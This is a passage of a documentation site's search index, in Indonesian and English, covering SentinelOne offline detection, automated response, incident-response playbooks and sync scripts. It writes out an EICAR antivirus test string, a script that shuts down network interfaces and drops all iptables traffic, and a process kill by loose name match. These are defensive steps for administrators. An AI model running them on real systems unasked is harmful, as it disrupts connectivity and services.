Synchronization&lt;br/&gt;Event Upload\"]\n        POLICY_UPDATE[\"Policy Refresh&lt;br/&gt;Latest Rules\"]\n        REPORT[\"Incident Reporting&lt;br/&gt;Offline Activity Summary\"]\n    end\n\n    AGENT_ONLINE --&gt; CONSOLE\n    CONSOLE --&gt; CLOUD_INTEL\n\n    AGENT_ONLINE --&gt;|\"Connection Lost\"| DISCONNECT\n    DISCONNECT --&gt; CACHE_POLICY\n    DISCONNECT --&gt; LOCAL_BUFFER\n\n    CACHE_POLICY --&gt; LOCAL_SIGNATURES\n    CACHE_POLICY --&gt; BEHAVIORAL\n    CACHE_POLICY --&gt; HEURISTICS\n\n    LOCAL_SIGNATURES --&gt; QUARANTINE\n    BEHAVIORAL --&gt; AUTO_REMEDIATE\n    HEURISTICS --&gt; LOCAL_ISOLATE\n\n    AUTO_REMEDIATE --&gt; ROLLBACK\n    LOCAL_ISOLATE --&gt; LOG_COLLECTION\n\n    QUARANTINE --&gt; RECONNECT\n    LOG_COLLECTION --&gt; SYNC\n    SYNC --&gt; POLICY_UPDATE\n    POLICY_UPDATE --&gt; REPORT\n\n    style DISCONNECT fill:#ffebee\n    style CACHE_POLICY fill:#e8f5e8\n    style QUARANTINE fill:#fff3e0\n    style RECONNECT fill:#e3f2fd</code></pre>"},{"location":"security/offline-detection-response/#konfigurasi-offline-mode","title":"\ud83d\udd27 Konfigurasi Offline Mode","text":""},{"location":"security/offline-detection-response/#11-console-configuration","title":"1.1 Console Configuration","text":""},{"location":"security/offline-detection-response/#offline-policy-setup","title":"Offline Policy Setup","text":"<pre><code>flowchart LR\n    CONSOLE[\"Management Console\"] --&gt; POLICY[\"Create Offline Policy\"]\n    POLICY --&gt; DETECTION[\"Configure Detection&lt;br/&gt;Sensitivity Levels\"]\n    DETECTION --&gt; RESPONSE[\"Define Response&lt;br/&gt;Actions\"]\n    RESPONSE --&gt; CACHING[\"Enable Policy&lt;br/&gt;Caching\"]\n    CACHING --&gt; DEPLOY[\"Deploy to&lt;br/&gt;Agent Groups\"]\n\n    style CONSOLE fill:#e3f2fd\n    style DETECTION fill:#e8f5e8\n    style RESPONSE fill:#fff3e0\n    style DEPLOY fill:#fce4ec</code></pre>"},{"location":"security/offline-detection-response/#step-by-step-configuration","title":"Step-by-Step Configuration","text":"<p>Step 1: Enable Offline Detection <pre><code>Console Navigation:\n1. Navigate to Policies &gt; [Your Policy Name]\n2. Go to Detection tab\n3. Enable \"Offline Detection Mode\"\n4. Set detection sensitivity: Conservative / Balanced / Aggressive\n</code></pre></p> <p>Step 2: Configure Offline Response <pre><code>{\n  \"offline_policy\": {\n    \"detection\": {\n      \"mode\": \"autonomous\",\n      \"sensitivity\": \"balanced\",\n      \"cache_duration\": \"7d\",\n      \"signature_updates\": \"daily\"\n    },\n    \"response\": {\n      \"automatic_quarantine\": true,\n      \"network_isolation\": false,\n      \"file_rollback\": true,\n      \"collect_forensics\": true\n    },\n    \"buffering\": {\n      \"max_events\": 10000,\n      \"max_storage\": \"500MB\",\n      \"retention_period\": \"30d\"\n    }\n  }\n}\n</code></pre></p>"},{"location":"security/offline-detection-response/#12-agent-level-configuration","title":"1.2 Agent-Level Configuration","text":""},{"location":"security/offline-detection-response/#sentinelctl-offline-configuration","title":"sentinelctl Offline Configuration","text":"<pre><code># Enable offline detection mode\nsudo sentinelctl offline enable \\\n  --detection-mode \"autonomous\" \\\n  --cache-policies \\\n  --buffer-events\n\n# Configure offline behavior\nsudo sentinelctl offline configure \\\n  --max-buffer-size \"500MB\" \\\n  --max-offline-days \"30\" \\\n  --auto-quarantine \\\n  --collect-forensics\n\n# Set offline response actions\nsudo sentinelctl offline response \\\n  --quarantine-threats \\\n  --rollback-changes \\\n  --preserve-evidence \\\n  --local-logging\n\n# View offline configuration\nsudo sentinelctl offline status\n</code></pre>"},{"location":"security/offline-detection-response/#offline-policy-cache-management","title":"Offline Policy Cache Management","text":"<pre><code># Force policy cache update (while online)\nsudo sentinelctl cache update-policies\n\n# View cached policies\nsudo sentinelctl cache list-policies\n\n# Check cache expiration\nsudo sentinelctl cache check-expiry\n\n# Manually refresh signatures cache\nsudo sentinelctl cache update-signatures\n</code></pre>"},{"location":"security/offline-detection-response/#offline-threat-detection","title":"\ud83d\udea8 Offline Threat Detection","text":""},{"location":"security/offline-detection-response/#21-detection-capabilities-in-offline-mode","title":"2.1 Detection Capabilities in Offline Mode","text":""},{"location":"security/offline-detection-response/#detection-matrix","title":"Detection Matrix","text":"<pre><code>graph TB\n    subgraph \"Offline Detection Capabilities\"\n        STATIC[\"Static Analysis&lt;br/&gt;\u2705 Signature-based&lt;br/&gt;\u2705 Hash matching&lt;br/&gt;\u2705 File reputation\"]\n\n        BEHAVIORAL[\"Behavioral Analysis&lt;br/&gt;\u2705 Process behavior&lt;br/&gt;\u2705 System calls&lt;br/&gt;\u26a0\ufe0f Limited ML models\"]\n\n        HEURISTIC[\"Heuristic Detection&lt;br/&gt;\u2705 Pattern matching&lt;br/&gt;\u2705 Anomaly detection&lt;br/&gt;\u2705 Rule-based logic\"]\n\n        NETWORK[\"Network Monitoring&lt;br/&gt;\u26a0\ufe0f Local traffic only&lt;br/&gt;\u274c Cloud reputation&lt;br/&gt;\u2705 Cached IOCs\"]\n    end\n\n    subgraph \"Detection Limitations\"\n        CLOUD_INTEL[\"\u274c Real-time Threat Intel\"]\n        REPUTATION[\"\u274c Live File Reputation\"]\n        GLOBAL_CONTEXT[\"\u274c Global Attack Context\"]\n        CLOUD_ML[\"\u274c Cloud ML Models\"]\n    end\n\n    STATIC -.-&gt;|\"Limited by\"| CLOUD_INTEL\n    BEHAVIORAL -.-&gt;|\"Limited by\"| CLOUD_ML\n    HEURISTIC -.-&gt;|\"Limited by\"| REPUTATION\n    NETWORK -.-&gt;|\"Limited by\"| GLOBAL_CONTEXT\n\n    style STATIC fill:#e8f5e8\n    style BEHAVIORAL fill:#fff3e0\n    style CLOUD_INTEL fill:#ffebee</code></pre>"},{"location":"security/offline-detection-response/#22-offline-detection-scenarios","title":"2.2 Offline Detection Scenarios","text":""},{"location":"security/offline-detection-response/#scenario-a-malware-detection-while-offline","title":"Scenario A: Malware Detection While Offline","text":"<pre><code>#!/bin/bash\n# Simulate offline malware detection\n\necho \"=== Offline Malware Detection Scenario ===\"\n\n# Step 1: Verify agent is in offline mode\necho \"Checking agent offline status:\"\nsudo sentinelctl status | grep -i offline\n\n# Step 2: Create EICAR test file (safe malware sample)\necho \"Creating EICAR test file:\"\necho 'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' &gt; /tmp/eicar_offline.txt\n\n# Step 3: Monitor detection\necho \"Monitoring for offline detection:\"\nsudo sentinelctl logs --tail 10 --follow &amp;\nLOG_PID=$!\n\nsleep 10\nkill $LOG_PID\n\n# Step 4: Check quarantine status\necho \"Checking quarantine:\"\nsudo sentinelctl quarantine list\n\n# Step 5: Review offline events\necho \"Offline events buffer:\"\nsudo sentinelctl offline events --count\n</code></pre>"},{"location":"security/offline-detection-response/#scenario-b-behavioral-threat-detection","title":"Scenario B: Behavioral Threat Detection","text":"<pre><code># PowerShell script for Windows offline behavioral testing\nWrite-Host \"=== Offline Behavioral Detection Test ===\" -ForegroundColor Green\n\n# Step 1: Verify offline mode\n$status = &amp; \"C:\\Program Files\\SentinelOne\\Sentinel Agent\\SentinelCtl.exe\" status\nWrite-Host \"Agent Status: $status\"\n\n# Step 2: Simulate suspicious behavior\nWrite-Host \"Simulating suspicious process behavior...\" -ForegroundColor Yellow\n\n# Create suspicious process chain\n$proc1 = Start-Process cmd.exe -ArgumentList \"/c timeout 30\" -PassThru\n$proc2 = Start-Process powershell.exe -ArgumentList \"-Command Start-Sleep 30\" -PassThru\n\n# Step 3: Monitor behavioral detection\nStart-Sleep 5\n&amp; \"C:\\Program Files\\SentinelOne\\Sentinel Agent\\SentinelCtl.exe\" logs --tail 5\n\n# Step 4: Cleanup\n$proc1 | Stop-Process -Force -ErrorAction SilentlyContinue\n$proc2 | Stop-Process -Force -ErrorAction SilentlyContinue\n\nWrite-Host \"Behavioral test completed\" -ForegroundColor Green\n</code></pre>"},{"location":"security/offline-detection-response/#automated-response-actions","title":"\u26a1 Automated Response Actions","text":""},{"location":"security/offline-detection-response/#31-offline-response-workflow","title":"3.1 Offline Response Workflow","text":"<pre><code>flowchart TD\n    THREAT[\"Threat Detected&lt;br/&gt;Offline Mode\"] --&gt; ASSESS[\"Risk Assessment&lt;br/&gt;Local Analysis\"]\n\n    ASSESS --&gt; HIGH{\"High Risk&lt;br/&gt;Threat?\"}\n    HIGH --&gt;|\"Yes\"| QUARANTINE[\"Immediate Quarantine&lt;br/&gt;Isolate Threat\"]\n    HIGH --&gt;|\"No\"| MEDIUM{\"Medium Risk&lt;br/&gt;Threat?\"}\n\n    QUARANTINE --&gt; ROLLBACK[\"File Rollback&lt;br/&gt;Restore Clean State\"]\n    ROLLBACK --&gt; ISOLATE[\"Network Isolation&lt;br/&gt;Prevent Spread\"]\n    ISOLATE --&gt; FORENSICS[\"Collect Forensics&lt;br/&gt;Evidence Preservation\"]\n\n    MEDIUM --&gt;|\"Yes\"| MONITOR[\"Enhanced Monitoring&lt;br/&gt;Behavioral Analysis\"]\n    MEDIUM --&gt;|\"No\"| LOG[\"Log Event&lt;br/&gt;Record Activity\"]\n\n    MONITOR --&gt; ESCALATE{\"Escalation&lt;br/&gt;Needed?\"}\n    ESCALATE --&gt;|\"Yes\"| QUARANTINE\n    ESCALATE --&gt;|\"No\"| LOG\n\n    FORENSICS --&gt; BUFFER[\"Event Buffering&lt;br/&gt;Store for Sync\"]\n    LOG --&gt; BUFFER\n\n    BUFFER --&gt; WAIT[\"Wait for&lt;br/&gt;Connectivity\"]\n    WAIT --&gt; SYNC[\"Sync to Console&lt;br/&gt;Report Incidents\"]\n\n    style THREAT fill:#ffebee\n    style QUARANTINE fill:#e8f5e8\n    style ISOLATE fill:#fff3e0\n    style SYNC fill:#e3f2fd</code></pre>"},{"location":"security/offline-detection-response/#32-response-action-configuration","title":"3.2 Response Action Configuration","text":""},{"location":"security/offline-detection-response/#automated-response-rules","title":"Automated Response Rules","text":"<pre><code># offline-response-rules.yaml\nresponse_rules:\n  critical_threats:\n    - threat_types: [\"malware\", \"ransomware\"]\n      actions:\n        - \"quarantine_immediately\"\n        - \"rollback_file_changes\"\n        - \"collect_forensics\"\n        - \"log_incident\"\n\n  suspicious_behavior:\n    - threat_types: [\"behavioral\", \"anomalous\"]\n      actions:\n        - \"enhance_monitoring\"\n        - \"collect_process_tree\"\n        - \"log_detailed_activity\"\n\n  policy_violations:\n    - threat_types: [\"policy_breach\", \"unauthorized_access\"]\n      actions:\n        - \"block_action\"\n        - \"log_violation\"\n        - \"alert_local_admin\"\n\n  network_threats:\n    - threat_types: [\"c2_communication\", \"data_exfiltration\"]\n      actions:\n        - \"block_network_connection\"\n        - \"quarantine_process\"\n        - \"collect_network_forensics\"\n</code></pre> <pre><code># Apply offline response rules\nsudo sentinelctl offline response-rules apply --config offline-response-rules.yaml\n\n# Test response actions\nsudo sentinelctl offline test-response --threat-type malware\n\n# View response history\nsudo sentinelctl offline response-history --last 24h\n</code></pre>"},{"location":"security/offline-detection-response/#manual-response-procedures","title":"\ud83d\udcf1 Manual Response Procedures","text":""},{"location":"security/offline-detection-response/#41-offline-incident-response-playbook","title":"4.1 Offline Incident Response Playbook","text":""},{"location":"security/offline-detection-response/#phase-1-detection-and-assessment","title":"Phase 1: Detection and Assessment","text":"<pre><code>#!/bin/bash\n# Offline Incident Response - Phase 1: Detection\n\necho \"=== Phase 1: Offline Threat Detection ===\"\n\n# Step 1: Check for active threats\necho \"Checking for active threats:\"\nsudo sentinelctl threats list --status active\n\n# Step 2: Review recent detections\necho \"Recent detections (last 1 hour):\"\nsudo sentinelctl threats list --since 1h\n\n# Step 3: Analyze threat severity\necho \"Threat severity breakdown:\"\nsudo sentinelctl threats stats --group-by severity\n\n# Step 4: Check quarantine status\necho \"Current quarantine status:\"\nsudo sentinelctl quarantine list --status active\n\n# Step 5: System health check\necho \"System health status:\"\nsudo sentinelctl health check --offline-mode\n</code></pre>"},{"location":"security/offline-detection-response/#phase-2-containment-and-mitigation","title":"Phase 2: Containment and Mitigation","text":"<pre><code>#!/bin/bash\n# Offline Incident Response - Phase 2: Containment\n\necho \"=== Phase 2: Offline Threat Containment ===\"\n\n# Function to contain threats\ncontain_threat() {\n    local threat_id=$1\n\n    echo \"Containing threat: $threat_id\"\n\n    # Quarantine the threat\n    sudo sentinelctl threats quarantine --id $threat_id\n\n    # Rollback file changes if needed\n    sudo sentinelctl threats rollback --id $threat_id\n\n    # Collect forensic data\n    sudo sentinelctl forensics collect --threat-id $threat_id\n\n    echo \"Threat $threat_id contained successfully\"\n}\n\n# Get active threats\nactive_threats=$(sudo sentinelctl threats list --status active --format json | jq -r '.[].id')\n\n# Contain each active threat\nfor threat_id in $active_threats; do\n    contain_threat $threat_id\ndone\n\necho \"All active threats contained\"\n</code></pre>"},{"location":"security/offline-detection-response/#phase-3-evidence-collection","title":"Phase 3: Evidence Collection","text":"<pre><code>#!/bin/bash\n# Offline Incident Response - Phase 3: Evidence Collection\n\necho \"=== Phase 3: Evidence Collection ===\"\n\n# Create forensics package\nFORENSICS_DIR=\"/tmp/offline_forensics_$(date +%Y%m%d_%H%M%S)\"\nmkdir -p $FORENSICS_DIR\n\necho \"Collecting evidence in: $FORENSICS_DIR\"\n\n# Collect system state\nsudo sentinelctl system snapshot --output $FORENSICS_DIR/system_snapshot.json\n\n# Collect threat artifacts\nsudo sentinelctl threats export --format json --output $FORENSICS_DIR/threats.json\n\n# Collect quarantine information\nsudo sentinelctl quarantine export --output $FORENSICS_DIR/quarantine.json\n\n# Collect agent logs\nsudo sentinelctl logs export --output $FORENSICS_DIR/agent_logs.zip\n\n# Collect process tree\nsudo sentinelctl processes export --output $FORENSICS_DIR/process_tree.json\n\n# Create evidence package\ntar -czf $FORENSICS_DIR.tar.gz -C /tmp $(basename $FORENSICS_DIR)\n\necho \"Evidence package created: $FORENSICS_DIR.tar.gz\"\n</code></pre>"},{"location":"security/offline-detection-response/#42-emergency-response-procedures","title":"4.2 Emergency Response Procedures","text":""},{"location":"security/offline-detection-response/#network-isolation-critical-situations","title":"Network Isolation (Critical Situations)","text":"<pre><code>#!/bin/bash\n# Emergency Network Isolation Script\n\necho \"=== EMERGENCY: Network Isolation Procedure ===\"\n\n# WARNING: This will disconnect the system from network\nread -p \"Are you sure you want to isolate this system? (yes/no): \" confirm\n\nif [ \"$confirm\" = \"yes\" ]; then\n    echo \"Initiating network isolation...\"\n\n    # Method 1: Using SentinelOne (if available)\n    sudo sentinelctl network isolate --reason \"Emergency containment\"\n\n    # Method 2: System-level isolation (backup)\n    if [ $? -ne 0 ]; then\n        echo \"Using system-level network isolation\"\n\n        # Disable network interfaces (Linux)\n        for interface in $(ip link show | grep -E '^[0-9]+:' | cut -d: -f2 | grep -v lo); do\n            sudo ip link set $interface down\n            echo \"Disabled interface: $interface\"\n        done\n\n        # Block all traffic (iptables)\n        sudo iptables -P INPUT DROP\n        sudo iptables -P OUTPUT DROP\n        sudo iptables -P FORWARD DROP\n\n        echo \"Network isolation completed using system controls\"\n    fi\n\n    # Log the isolation\n    echo \"$(date): Emergency network isolation activated\" | sudo tee -a /var/log/sentinelone_isolation.log\n\nelse\n    echo \"Network isolation cancelled\"\nfi\n</code></pre>"},{"location":"security/offline-detection-response/#system-recovery-procedure","title":"System Recovery Procedure","text":"<pre><code># Windows Emergency Recovery Script\nWrite-Host \"=== Emergency System Recovery ===\" -ForegroundColor Red\n\n# Step 1: Stop suspicious processes\nWrite-Host \"Stopping suspicious processes...\" -ForegroundColor Yellow\n$suspiciousProcesses = Get-Process | Where-Object {\n    $_.ProcessName -match \"(temp|malware|suspicious)\"\n}\n\nforeach ($proc in $suspiciousProcesses) {\n    try {\n        Stop-Process -Id $proc.Id -Force\n        Write-Host \"Stopped process: $($proc.ProcessName)\" -ForegroundColor Green\n    }\n    catch {\n        Write-Host \"Failed to stop process: $($proc.ProcessName)\" -ForegroundColor Red\n    }\n}\n\n# Step 2: Check and restore system files\nWrite-Host \"Running system file check...\" -ForegroundColor Yellow\nStart-Process sfc -ArgumentList \"/scannow\" -Wait -NoNewWindow\n\n# Step 3: Create system restore point\nWrite-Host \"Creating system restore point...\" -ForegroundColor Yellow\nCheckpoint-Computer -Description \"SentinelOne Emergency Recovery\" -RestorePointType \"MODIFY_SETTINGS\"\n\n# Step 4: Collect recovery information\n$recoveryInfo = @{\n    'timestamp' = Get-Date\n    'processes_stopped' = $suspiciousProcesses.Count\n    'system_status' = 'recovering'\n    'next_steps' = 'Wait for network recovery and sync with console'\n}\n\n$recoveryInfo | ConvertTo-Json | Out-File \"C:\\temp\\recovery_info.json\"\n\nWrite-Host \"Emergency recovery procedures completed\" -ForegroundColor Green\nWrite-Host \"Recovery information saved to C:\\temp\\recovery_info.json\" -ForegroundColor Cyan\n</code></pre>"},{"location":"security/offline-detection-response/#recovery-and-synchronization","title":"\ud83d\udd04 Recovery and Synchronization","text":""},{"location":"security/offline-detection-response/#51-network-recovery-detection","title":"5.1 Network Recovery Detection","text":"<pre><code>sequenceDiagram\n    participant AGENT as SentinelOne Agent\n    participant NETWORK as Network Stack\n    participant CONSOLE as Management Console\n    participant SYNC as Sync Service\n\n    loop Network Monitoring\n        AGENT-&gt;&gt;NETWORK: Health Check Ping\n        alt Network Available\n            NETWORK--&gt;&gt;AGENT: Success Response\n            AGENT-&gt;&gt;CONSOLE: Attempt Connection\n            CONSOLE--&gt;&gt;AGENT: Authentication Success\n            AGENT-&gt;&gt;SYNC: Initiate Data Sync\n\n            Note over SYNC: Sync offline events,&lt;br/&gt;threat data, forensics\n\n            SYNC-&gt;&gt;CONSOLE: Upload Buffered Events\n            CONSOLE--&gt;&gt;SYNC: ACK Events Received\n\n            SYNC-&gt;&gt;CONSOLE: Upload Threat Data\n            CONSOLE--&gt;&gt;SYNC: Process Threats\n\n            AGENT-&gt;&gt;CONSOLE: Request Policy Updates\n            CONSOLE--&gt;&gt;AGENT: Send Latest Policies\n\n            AGENT-&gt;&gt;AGENT: Exit Offline Mode\n        else Network Unavailable\n            NETWORK--&gt;&gt;AGENT: Timeout/Failure\n            AGENT-&gt;&gt;AGENT: Continue Offline Mode\n        end\n    end</code></pre>"},{"location":"security/offline-detection-response/#52-automatic-synchronization-process","title":"5.2 Automatic Synchronization Process","text":"<pre><code>#!/bin/bash\n# Automated Recovery and Sync Script\n\necho \"=== SentinelOne Offline Recovery ===\"\n\n# Function to test connectivity\ntest_connectivity() {\n    echo \"Testing network connectivity...\"\n\n    # Test console connectivity\n    if sudo sentinelctl network test --timeout 10; then\n        echo \"\u2705 Console connectivity restored\"\n        return 0\n    else\n        echo \"\u274c Console still unreachable\"\n        return 1\n    fi\n}\n\n# Function to sync offline data\nsync_offline_data() {\n    echo \"Starting offline data synchronization...\"\n\n    # Upload buffered events\n    echo \"Uploading buffered events...\"\n    sudo sentinelctl offline sync-events\n\n    # Upload threat data\n    echo \"Uploading threat detections...\"\n    sudo sentinelctl offline sync-threats\n\n    # Upload forensic data\n    echo \"Uploading forensic evidence...\"\n    sudo sentinelctl offline sync-forensics\n\n    # Refresh policies\n    echo \"Updating policies from console...\"\n    sudo sentinelctl policy refresh\n\n    echo \"\u2705 Offline data sync completed\"\n}\n\n# Function to validate recovery\nvalidate_recovery() {\n    echo \"Validating recovery status...\"\n\n    # Check agent status\n    local status=$(sudo sentinelctl status | grep -i \"mode\")\n    echo \"Agent mode: $status\"\n\n    # Check threat sync status\n    local pending=$(sudo sentinelctl offline pending-events)\n    echo \"Pending events: $pending\"\n\n    # Check policy freshness\n    local policy_age=$(sudo sentinelctl policy age)\n    echo \"Policy age: $policy_age\"\n\n    if [[ \"$status\" == *\"online\"* &amp;&amp; \"$pending\" == \"0\" ]]; then\n        echo \"\u2705 Recovery successful\"\n        return 0\n    else\n        echo \"\u26a0\ufe0f Recovery incomplete\"\n        return 1\n    fi\n}\n\n# Main recovery loop\nwhile true; do\n    if test_connectivity; then\n        sync_offline_data\n        if validate_recovery; then\n            echo \"\ud83c\udf89 Full recovery completed successfully\"\n            break\n        else\n            echo \"\u26a0\ufe0f Recovery issues detected, retrying...\"\n            sleep 30\n        fi\n    else\n        echo \"\u23f3 Waiting for connectivity... (checking again in 60 seconds)\"\n        sleep 60\n    fi\ndone\n</code></pre>"},{"location":"security/offline-detection-response/#offline-operations-monitoring","title":"\ud83d\udcca Offline Operations Monitoring","text":""},{"location":"security/offline-detection-response/#61-offline-status-dashboard","title":"6.1 Offline Status Dashboard","text":"<pre><code>#!/bin/bash\n# Offline Operations Status Script\n\necho \"=== SentinelOne Offline Operations Dashboard ===\"\necho \"Generated: $(date)\"\necho \"================================================\"\n\n# Agent Status\necho \"\ud83e\udd16 AGENT STATUS:\"\nsudo sentinelctl status | grep -E \"(Status|Mode|Version|Last Connection)\"\necho\n\n# Threat Summary\necho \"\ud83d\udea8 THREAT SUMMARY:\"\necho \"Active Threats: $(sudo sentinelctl threats count --status active)\"\necho \"Quarantined: $(sudo sentinelctl quarantine count)\"\necho \"Total Offline Detections: $(sudo sentinelctl offline events count)\"\necho\n\n# Buffer Status\necho \"\ud83d\udcbe BUFFER STATUS:\"\nsudo sentinelctl offline buffer-status\necho\n\n# System Health\necho \"\ud83d\udc9a SYSTEM HEALTH:\"\nsudo sentinelctl health check --offline-mode | grep -E \"(CPU|Memory|Disk|Status)\"\necho\n\n# Recent Activity\necho \"\ud83d\udccb RECENT ACTIVITY (Last 4 hours):\"\nsudo sentinelctl logs --since 4h --level warn,error | head -10\necho\n\n# Pending Sync\necho \"\u23f3 PENDING SYNCHRONIZATION:\"\necho \"Events: $(sudo sentinelctl offline pending-events)\"\necho \"Threats: $(sudo sentinelctl offline pending-threats)\"\necho \"Forensics: $(sudo sentinelctl offline pending-forensics)\"\necho\n\necho \"================================================\"\necho \"Next update: $(date -d '+5 minutes')\"\n</code></pre>"},{"location":"security/offline-detection-response/#62-offline-performance-metrics","title":"6.2 Offline Performance Metrics","text":"<pre><code>#!/usr/bin/env python3\n\"\"\"\nSentinelOne Offline Performance Monitor\n\"\"\"\n\nimport subprocess\nimport json\nimport time\nfrom datetime import datetime, timedelta\n\nclass OfflineMonitor:\n    def __init__(self):\n        self.metrics = {}\n\n    def collect_metrics(self):\n        \"\"\"Collect offline performance metrics\"\"\"\n\n        # Detection metrics\n        detection_stats = self.get_detection_stats()\n\n        # Performance metrics\n        performance_stats = self.get_performance_stats()\n\n        # Buffer metrics\n        buffer_stats = self.get_buffer_stats()\n\n        self.metrics = {\n            'timestamp': datetime.now().isoformat(),\n            'detection': detection_stats,\n            'performance': performance_stats,\n            'buffer': buffer_stats\n        }\n\n        return self.metrics\n\n    def get_detection_stats(self):\n        \"\"\"Get offline detection statistics\"\"\"\n        try:\n            # Run sentinelctl to get detection stats\n            result = subprocess.run(\n                ['sudo', 'sentinelctl', 'offline', 'stats', '--json'],\n                capture_output=True, text=True\n            )\n\n            if result.returncode == 0:\n                return json.loads(result.stdout)\n            else:\n                return {'error': result.stderr}\n\n        except Exception as e:\n            return {'error': str(e)}\n\n    def get_performance_stats(self):\n        \"\"\"Get offline performance impact\"\"\"\n        try:\n            result = subprocess.run(\n                ['sudo', 'sentinelctl', 'performance', 'offline', '--json'],\n                capture_output=True, text=True\n            )\n\n            if result.returncode == 0:\n                return json.loads(result.stdout)\n            else:\n                return {'error': result.stderr}\n\n        except Exception as e:\n            return {'error': str(e)}\n\n    def get_buffer_stats(self):\n        \"\"\"Get event buffer statistics\"\"\"\n        try:\n            result = subprocess.run(\n                ['sudo', 'sentinelctl', 'offline', 'buffer-info', '--json'],\n                capture_output=True, text=True\n            )\n\n            if result.returncode == 0:\n                return json.loads(result.stdout)\n            else:\n                return {'error': result.stderr}\n\n        except Exception as e:\n            return {'error': str(e)}\n\n    def generate_report(self):\n        \"\"\"Generate offline operations report\"\"\"\n        metrics = self.collect_metrics()\n\n        report = f\"\"\"\n=== SentinelOne Offline Operations Report ===\nGenerated: {metrics['timestamp']}\n\n\ud83d\udcca Detection Performance:\n- Threats Detected: {metrics['detection'].get('total_threats', 'N/A')}\n- Response Time: {metrics['detection'].get('avg_response_time', 'N/A')}s\n- Success Rate: {metrics['detection'].get('success_rate', 'N/A')}%\n\n\ud83d\udcbb System Performance:\n- CPU Usage: {metrics['performance'].get('cpu_usage', 'N/A')}%\n- Memory Usage: {metrics['performance'].get('memory_usage', 'N/A')}MB\n- Disk I/O: {metrics['performance'].get('disk_io', 'N/A')}MB/s\n\n\ud83d\udcbe Buffer Status:\n- Events Buffered: {metrics['buffer'].get('event_count', 'N/A')}\n- Buffer Size: {metrics['buffer'].get('size_mb', 'N/A')}MB\n- Buffer Utilization: {metrics['buffer'].get('utilization', 'N/A')}%\n\n================================================\n        \"\"\"\n\n        return report\n\nif __name__ == \"__main__\":\n    monitor = OfflineMonitor()\n    print(monitor.generate_report())\n</code></pre>"},{"location":"security/offline-detection-response/#validation-checklist","title":"\u2705 Validation Checklist","text":""},{"location":"security/offline-detection-response/#offline-preparedness","title":"Offline Preparedness","text":"<ul> <li>[ ] Offline Mode Enabled: Agent configured for offline operation</li> <li>[ ] Policies Cached: Latest policies stored locally</li> <li>[ ] Signatures Updated: Recent signature databases cached</li> <li>[ ] Response Rules: Automated response actions configured</li> <li>[ ] Buffer Configuration: Adequate storage for offline events</li> </ul>"},{"location":"security/offline-detection-response/#detection-capabilities","title":"Detection Capabilities","text":"<ul> <li>[ ] Static Detection: Signature-based detection functional</li> <li>[ ] Behavioral Analysis: Behavioral engine operational offline</li> <li>[ ] Heuristic Detection: Pattern recognition working</li> <li>[ ] Quarantine Function: Threat isolation capabilities active</li> <li>[ ] Rollback Ability: File system rollback functional</li> </ul>"},{"location":"security/offline-detection-response/#response-procedures","title":"Response Procedures","text":"<ul> <li>[ ] Manual Playbooks: Offline incident response documented</li> <li>[ ] Emergency Procedures: Critical response actions defined</li> <li>[ ] Evidence Collection: Forensics collection procedures ready</li> <li>[ ] Communication Plans: Alternative communication channels established</li> <li>[ ] Recovery Procedures: Network recovery and sync processes tested</li> </ul>"},{"location":"security/offline-detection-response/#testing-and-validation","title":"Testing and Validation","text":"<ul> <li>[ ] Offline Testing: Regular offline scenarios tested</li> <li>[ ] Recovery Testing: Network recovery procedures validated</li> <li>[ ] Sync Validation: Data synchronization accuracy verified</li> <li>[ ] Performance Impact: Offline mode performance acceptable</li> <li>[ ] Documentation: All procedures documented and accessible</li> </ul> <p>Untuk bantuan lebih lanjut dengan offline detection dan response, hubungi Security Team atau rujuk ke SentinelOne Offline Operations Guide.</p> <p>Last updated: 6 Agustus 2025</p>"},{"location":"security/real-time-telemetry/","title":"Konfigurasi Real-Time Telemetry SentinelOne","text":"<p>Panduan komprehensif untuk mengkonfigurasi, mengelola, dan mengoptimalkan real-time telemetry streaming untuk monitoring kontinyu dan analitik keamanan.</p>"},{"location":"security/real-time-telemetry/#arsitektur-real-time-telemetry","title":"\ud83d\udcf6 Arsitektur Real-Time Telemetry","text":"<pre><code>flowchart TB\n    subgraph \"SentinelOne Endpoints\"\n        WIN_AGENT[\"Windows Agent&lt;br/&gt;Telemetry Collector\"]\n        LINUX_AGENT[\"Linux Agent&lt;br/&gt;Telemetry Collector\"]\n        MAC_AGENT[\"macOS Agent&lt;br/&gt;Telemetry Collector\"]\n    end\n\n    subgraph \"Data Collection Layer\"\n        PROCESS[\"Process Events&lt;br/&gt;Process Creation/Termination\"]\n        NETWORK[\"Network Events&lt;br/&gt;Connection/DNS/HTTP\"]\n        FILE[\"File Events&lt;br/&gt;File Operations\"]\n        REGISTRY[\"Registry Events&lt;br/&gt;Windows Registry Changes\"]\n        USER[\"User Events&lt;br/&gt;Authentication/Session\"]\n    end\n\n    subgraph \"Telemetry Processing\"\n        FILTER[\"Event Filtering&lt;br/&gt;Noise Reduction\"]\n        ENRICH[\"Data Enrichment&lt;br/&gt;Context Addition\"]\n        FORMAT[\"Data Formatting&lt;br/&gt;JSON/CEF/LEEF\"]\n        COMPRESS[\"Compression&lt;br/&gt;Bandwidth Optimization\"]\n    end\n\n    subgraph \"Transport Layer\"\n        HTTPS[\"HTTPS Transport&lt;br/&gt;TLS 1.2+\"]\n        BUFFER[\"Local Buffer&lt;br/&gt;Offline Resilience\"]\n        RETRY[\"Retry Logic&lt;br/&gt;Delivery Guarantee\"]\n    end\n\n    subgraph \"Destination Systems\"\n        SIEM[\"SIEM Platform&lt;br/&gt;Splunk/QRadar/Sentinel\"]\n        LAKE[\"Data Lake&lt;br/&gt;S3/Azure Blob/GCS\"]\n        STREAM[\"Stream Processing&lt;br/&gt;Kafka/EventHub\"]\n        ANALYTICS[\"Analytics Platform&lt;br/&gt;Elasticsearch/BigQuery\"]\n    end\n\n    WIN_AGENT --&gt; PROCESS\n    WIN_AGENT --&gt; NETWORK\n    WIN_AGENT --&gt; FILE\n    WIN_AGENT --&gt; REGISTRY\n    WIN_AGENT --&gt; USER\n\n    LINUX_AGENT --&gt; PROCESS\n    LINUX_AGENT --&gt; NETWORK\n    LINUX_AGENT --&gt; FILE\n    LINUX_AGENT --&gt; USER\n\n    MAC_AGENT --&gt; PROCESS\n    MAC_AGENT --&gt; NETWORK\n    MAC_AGENT --&gt; FILE\n    MAC_AGENT --&gt; USER\n\n    PROCESS --&gt; FILTER\n    NETWORK --&gt; FILTER\n    FILE --&gt; FILTER\n    REGISTRY --&gt; FILTER\n    USER --&gt; FILTER\n\n    FILTER --&gt; ENRICH\n    ENRICH --&gt; 